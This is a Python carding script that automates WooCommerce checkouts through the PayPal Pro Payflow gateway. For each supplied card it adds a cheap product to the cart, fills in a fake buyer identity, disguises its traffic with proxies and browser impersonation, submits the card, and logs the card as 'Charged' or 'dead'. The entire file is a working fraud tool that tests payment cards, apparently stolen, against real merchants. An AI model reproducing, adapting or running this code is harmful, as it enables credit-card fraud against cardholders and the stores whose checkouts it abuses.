import asyncio
import random
import re
import html
import base64
import json
from curl_cffi.requests import AsyncSession
from curl_cffi.requests import exceptions as ccx
from urllib.parse import urlparse, quote
from utils.address_helper import get_address
from utils.helper import split_card_details
from utils.logs import logs
from bs4 import BeautifulSoup
import requests


async def paypalflow_cc(card: str, base_url: str, proxy: str, max_retries: int = 3):

    for attempt in range(1, max_retries + 1):

        ####################### CONFIGURATION #########################
        site = urlparse(base_url if base_url.startswith(
            ("http://", "https://")) else f"https://{base_url}").hostname
        random_num = random.randint(1, 999)
        impersonate = random.choice(["chrome", "edge", "safari", "firefox"])

        card_details, cc, mm, m, yyyy, yy, cvv = split_card_details(card)

        ####################### FAKE INFORMATION #########################
        domain_to_country = {
            '.uk': 'gb',
            '.au': 'au',
            '.ca': 'ca',
        }

        site_country = "us"
        for suffix, country in {'.uk': 'gb', '.au': 'au', '.ca': 'ca'}.items():
            if suffix in site:
                site_country = country
                break

        information_data = get_address(site_country)
        user = information_data["user"]
        address = information_data["address"]

        if cc[0:1] == "5":
            card_type = "MASTER_CARD"
        elif cc[0:1] == "4":
            card_type = "VISA"
        else:
            logs("error", site, card_details,
                 "Card type is not supported", "PPCP Insu Auth")
            return

        first_name, last_name, email, phone, user_agent = (
            user.get("first_name", ""),
            user.get("last_name", ""),
            user.get("email", ""),
            user.get("phone", ""),
            user.get("user_agent", "")
        )

        street_address, city, region_code, state, postal_code, faker_postal_code, country = (
            address.get("street_address", ""),
            address.get("city", ""),
            address.get("region_code", ""),
            address.get("state", ""),
            address.get("postal_code"),
            address.get("faker_postal_code", ""),
            address.get("country", "")
        )
        proxy_body = {
            "http": proxy,
            "https": proxy,
        }
        email = f"{first_name}.{last_name}.{random_num}@gmail.com"
        try:
            await asyncio.sleep(random.uniform(0.5, 1.7))
            async with AsyncSession(impersonate=impersonate, proxies=proxy_body, verify=False, timeout=30) as session:

                headers = {
                    "User-Agent": user_agent,
                }

                ####################### Add To Cart - Checkout Flow #########################

                headers.update({
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "DNT": "1",
                    "Sec-GPC": "1",
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "1",
                    "Sec-Fetch-Dest": "document",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-Site": "none",
                    "Sec-Fetch-User": "?1",
                    "If-None-Match": "",
                    "Priority": "u=0, i",
                })

                response = await session.get(f"https://{site}/wp-json/wc/store/products?stock_status=instock&order=asc&orderby=price&min_price=1&max_price=99999999&page=1&per_page=100&type=simple", headers=headers)

                if response is None:
                    if attempt == max_retries:
                        logs("error", site, card,
                             "Add to Cart Failed", "Paypal Pro")
                        return
                    continue

                response_data = response.json()

                # Filter products
                available_product = [
                    product for product in response_data
                    if product.get("has_options") is False
                    and product.get("is_purchasable") is True
                    and product.get("is_in_stock") is True
                    and isinstance(product.get("add_to_cart"), dict)
                    and product["add_to_cart"].get("minimum") == 1
                ]

                if not available_product:
                    if attempt == max_retries:
                        logs("error", site, card,
                             "No Available Product Found", "Paypal Pro")
                        return
                    continue

                product = available_product[0]
                product_id = int(product.get("id"))
                currency_code = product.get(
                    "prices", {}).get("currency_code", "USD")
                product_price = f"{int(product.get('prices', {}).get('price', 0)) / 100:.2f}"

                response = await session.get(f"https://{site}/wp-json/wc/store/cart", headers=headers)

                if response is None:
                    if attempt == max_retries:
                        logs("error", site, card,
                             "Cart Retrieval Failed", "Paypal Pro")
                        return
                    continue

                nonce = response.headers.get(
                    "nonce") or response.headers.get("X-WC-Store-API-Nonce")

                if not nonce:
                    nonce_search = re.search(
                        r'"nonce"\s*:\s*"([^"]+)"', response.text)
                    if nonce_search:
                        nonce = nonce_search.group(1)

                if not nonce:
                    logs("error", site, card,
                         "Nonce Retrieval Failed", "Paypal Pro")
                    return

                payload = {
                    "id": int(product_id),
                    "quantity": 1,
                }

                headers.update({
                    "Nonce": nonce,
                    "X-WC-Store-API-Nonce": nonce
                })

                response = await session.post(f"https://{site}/wp-json/wc/store/cart/add-item", json=payload, headers=headers)

                if response is None:
                    if attempt == max_retries:
                        logs("error", site, card,
                             "Add to Cart Failed", "Paypal Pro")
                        return
                    continue

                response_data = response.json()

                errors = response_data.get("errors", [])
                if errors:
                    error_msg = html.unescape(errors[0].get("message", ""))
                    lower_msg = error_msg.lower()
                    logs("error", site, card,
                         f"Add to Cart Error - {error_msg} - {lower_msg} - {attempt}", "Paypal Pro")
                    return

                customer_address = {
                    "first_name": first_name,
                    "last_name": last_name,
                    "company": "Zed Pogi",
                    "address_1": street_address,
                    "address_2": street_address,
                    "city": city,
                    "state": region_code,
                    "postcode": postal_code,
                    "country": country,
                    "phone": phone,
                    "email": email,
                }

                customer_payload = {
                    "billing_address": customer_address,
                    "shipping_address": customer_address,
                }

                headers.update({
                    "Nonce": nonce,
                    "Content-Type": "application/json",
                    "X-WC-Store-API-Nonce": nonce,
                })

                response = await session.post(f"https://{site}/wp-json/wc/store/cart/update-customer", json=customer_payload, headers=headers)

                if response is None:
                    if attempt == max_retries:
                        logs("error", site, card,
                             "Customer Update Failed", "Paypal Pro")
                        return
                    continue

                response_data = response.json()
                shipping_rate = None

                if response_data.get('needs_shipping'):
                    try:
                        shipping_rate = response_data['shipping_rates'][0]['shipping_rates'][0]['rate_id']

                    except (IndexError, KeyError, TypeError):
                        shipping_rate = None

                    if not shipping_rate:
                        logs("error", site, card,
                             "Shipping Rate Not Found", "Paypal Pro")
                        return

                    payload = {
                        "rate_id": shipping_rate
                    }

                    headers.update({
                        "Nonce": nonce,
                        "X-WC-Store-API-Nonce": nonce,
                        "Content-Type": "application/json",
                    })

                    response = await session.post(f"https://{site}/wp-json/wc/store/cart/select-shipping-rate", headers=headers, json=payload)

                    if response.status_code != 200:
                        if attempt == max_retries:
                            logs("error", site, card,
                                 "Shipping Rate Selection Failed", "Paypal Pro")
                            return
                        continue

                headers.update({
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "DNT": "1",
                    "Sec-GPC": "1",
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "1",
                    "Sec-Fetch-Dest": "document",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-Site": "none",
                    "Sec-Fetch-User": "?1",
                    "Priority": "u=0, i"
                })
                response = await session.get(f"https://{site}/checkout", headers=headers)

                if response is None:
                    if attempt == max_retries:
                        logs("error", site, card,
                             "Checkout Page Retrieval Failed", "Paypal Pro")
                        return
                    continue

                soup = BeautifulSoup(response.text, "html.parser")
                wcnonce = soup.find(
                    "input", id="woocommerce-process-checkout-nonce").get("value")
                

                if not wcnonce:
                    if attempt == max_retries:
                        logs("error", site, card,
                             "WC Nonce Not Found", "Paypal Pro")
                        return
                    continue

                #print(wcnonce)

                headers = {
                    "User-Agent": user_agent,
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "X-Requested-With": "XMLHttpRequest",
                    "Origin": f"https://{site}",
                    "DNT": "1",
                    "Sec-GPC": "1",
                    "Connection": "keep-alive",
                    "Referer": f"https://{site}/checkout/",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-origin",
                    "Priority": "u=0",
                    "TE": "trailers",
                }

                payload = f"billing_first_name={quote(first_name)}&billing_last_name={quote(last_name)}&billing_company={quote(city)}&billing_country={country}&billing_address_1={quote(street_address)}&billing_address_2=&billing_city={quote(city)}&billing_state={region_code}&billing_postcode={postal_code}&billing_phone={phone}&billing_email={quote(email)}&payment_method=paypal_pro_payflow&paypal_pro_payflow-card-number={cc[0:4]}+{cc[4:8]}+{cc[8:12]}+{cc[12:16]}&paypal_pro_payflow-card-expiry={mm}+%2F+{yy}&terms=on&terms-field=1&account_password={quote(first_name)}{str(random.randint(111, 999))}&account_username={quote(last_name)}.{str(random.randint(1111, 9999))}&woocommerce-process-checkout-nonce={wcnonce}"

                response = await session.post(f"https://{site}/?wc-ajax=checkout", headers=headers, data=payload)
                if 'card expiration date is invalid' in response.text.lower():
                    payload = f"billing_first_name={quote(first_name)}&billing_last_name={quote(last_name)}&billing_company={quote(city)}&billing_country={country}&billing_address_1={quote(street_address)}&billing_address_2=&billing_city={quote(city)}&billing_state={region_code}&billing_postcode={postal_code}&billing_phone={phone}&billing_email={quote(email)}&payment_method=paypal_pro_payflow&paypal_pro_payflow-card-number={cc[0:4]}+{cc[4:8]}+{cc[8:12]}+{cc[12:16]}&paypal_pro_payflow_card_expiration_month={m}&paypal_pro_payflow_card_expiration_year={yy}&terms=on&terms-field=1&account_password={quote(first_name)}{str(random.randint(111, 999))}&account_username={quote(last_name)}.{str(random.randint(1111, 9999))}&woocommerce-process-checkout-nonce={wcnonce}"

                    response = await session.post(f"https://{site}/?wc-ajax=checkout", headers=headers, data=payload)

                    print(response.text)
                    return

                #print(response.text)

                result = response.json().get("result")
                is_success = result == "success" 
                raw_message = response.json().get("messages", "")
                clean_message = re.sub(r"<.*?>", "", raw_message).strip()

                if "Payment error:" in clean_message:
                    clean_message = clean_message.split("Payment error:", 1)[1].strip()

                #print(is_success, clean_message)

                if is_success:
                    logs("success", site, card,
                         f"Charged {currency_code} {product_price}", "Paypal Pro")
                    return
                elif is_success is False:
                    logs("dead", site, card,
                         f"Declined - {clean_message}", "Paypal Pro")
                    return
                else:
                    logs("error", site, card, f"status: {is_success}", "Paypal Pro")
                return

                
        except (ccx.ProxyError, ccx.ConnectionError, ccx.ConnectTimeout, ccx.Timeout, asyncio.TimeoutError) as e:
            if attempt == max_retries:
                logs("error", site, card,
                     f"FAILED] - {type(e).__name__}", "Cyber Flex")
                return
            continue

        except Exception as e:
            if attempt == max_retries:
                logs("error", site, card,
                     f"FAILED] - {type(e).__name__}", "Cyber Flex")
                return
            continue
